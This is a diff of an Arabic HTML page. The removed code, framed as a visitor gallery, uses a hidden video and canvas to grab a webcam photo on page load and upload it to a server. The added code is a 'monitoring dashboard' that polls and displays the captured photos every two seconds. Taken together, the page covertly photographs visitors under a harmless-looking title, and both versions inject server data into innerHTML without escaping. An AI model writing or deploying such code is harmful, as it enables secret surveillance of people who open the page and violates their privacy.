@@ -1,68 +1,25 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>معرض الصور</title>
-</head>
 <body>
-    <h1>معرض الزوار</h1>
-    <div id="gallery" style="display:flex; flex-wrap:wrap; gap:10px;"></div>
-
-    <video id="video" style="display:none;"></video>
-    <canvas id="canvas" style="display:none;" width="400" height="300"></canvas>
-
+    <h1>لوحة المراقبة</h1>
+    <div id="gallery" style="display:flex; flex-wrap:wrap; gap:20px;"></div>
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const gallery = document.getElementById('gallery');
-
-        // 1. التقاط الصورة فوراً عند تحميل الصفحة
-        async function initCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                video.play();
-                
-                // انتظار ثانية ليجهز الفيديو ثم التقاط الصورة
-                setTimeout(takePhoto, 1000);
-            } catch (err) {
-                console.error("يرجى الموافقة على إذن الكاميرا");
-            }
-        }
-
-        async function takePhoto() {
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, 400, 300);
-            const imageData = canvas.toDataURL('image/png');
-
-            // إرسال الصورة للسيرفر
-            await fetch('/upload', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: imageData })
-            });
-            loadPhotos(); // تحديث المعرض
-        }
-
-        // 2. تحميل الصور من السيرفر
-        async function loadPhotos() {
-            const res = await fetch('/get-photos');
+        async function updateGallery() {
+            const res = await fetch('/photos');
             const photos = await res.json();
-            gallery.innerHTML = '';
-            photos.forEach(p => {
-                const div = document.createElement('div');
-                div.innerHTML = `<img src="${p.data}" width="150"><br>
-                                 <button onclick="deletePhoto(${p.id})">حذف</button>`;
-                gallery.appendChild(div);
-            });
+            const gallery = document.getElementById('gallery');
+            gallery.innerHTML = photos.map(p => `
+                <div>
+                    <img src="${p.data}" width="200" style="border:2px solid black;">
+                    <br><button onclick="deletePhoto(${p.id})">حذف الصورة</button>
+                </div>
+            `).join('');
         }
-
         async function deletePhoto(id) {
             await fetch(`/delete/${id}`, { method: 'DELETE' });
-            loadPhotos();
+            updateGallery();
         }
-
-        initCamera();
+        setInterval(updateGallery, 2000); // تحديث تلقائي كل ثانيتين
     </script>
 </body>
 </html>
